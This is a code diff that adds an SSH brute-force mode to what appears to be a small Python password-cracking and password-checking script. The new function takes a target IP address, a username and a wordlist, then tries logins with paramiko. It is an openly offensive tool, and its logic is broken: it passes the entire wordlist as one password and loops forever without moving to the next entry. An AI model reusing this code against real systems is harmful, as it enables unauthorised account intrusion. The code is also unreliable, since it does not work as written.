@@ -41,12 +41,37 @@ def password_recognized():
         else:
             # If `input_string` is not found in the word list, print a message indicating that it was not found
             print(f"The string '{input_string}' did not appear in the word list.")
+def sshbruteforce():
+    # Get input from user
+    host = input("Please provide an IP address to connect to: ")
+    user = input("Please provide a username: ")
+    filepath = input("Please provide file path to wordlist: ")
+    port = 22
+
+    with open(filepath, 'r') as file: 
+        password=file.readlines() 
+    while password:  
+
+        try:
+            # Create object of SSHClient and connect to SSH
+            ssh = paramiko.SSHClient()
+            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            ssh.connect(host, port, user, password)
+    
+            print(f"Login Successful with password {password}")
+            break
+
+        except paramiko.AuthenticationException as e:
+            print("Authentication Failed!")
+            print(e)
+
+        ssh.close()
 
 def main():
     print("Select one of the following modes:")
     print("Mode 1: Offensive; Dictionary Iterator")
     print("Mode 2: Defensive; Password Recognized")
-
+    print("Mode 3: SSH; Bruteforce attack")
     # Prompt the user to enter the mode number (1 or 2)
     mode = input("Enter the mode number (1 or 2): ")
 
@@ -56,6 +81,8 @@ def main():
     elif mode == "2":
         # If the user selects Mode 2 (Defensive), call the `password_recognized()` function
         password_recognized()
+    elif mode == "3":
+        sshbruteforce()
     else:
         # If the user enters an invalid mode number, print an error message
         print("Invalid mode selected. Please choose either '1' or '2'.")
